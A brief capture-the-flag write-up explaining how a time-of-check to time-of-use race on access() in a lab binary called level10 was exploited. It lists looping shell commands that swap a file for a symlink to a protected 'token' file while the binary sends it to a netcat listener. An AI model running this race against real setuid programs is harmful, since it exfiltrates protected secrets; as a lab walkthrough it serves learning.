When we used ltrace on level10 we saw a call to access.
access is known to have a security hole because there is a Time-of-check to time-of-use exploit.
So first we did:

$> chmod 777 .

and then we openned 2 other terminals to run those 3 commands in each of them:

$> while true; do rm exploit; echo "not yet" > exploit; chmod 777 exploit; ./level10 exploit 10.12.1.133; done

$> while true; do nc -l 6969 ; done

$> while true; do rm exploit; ln -s token exploit ; done
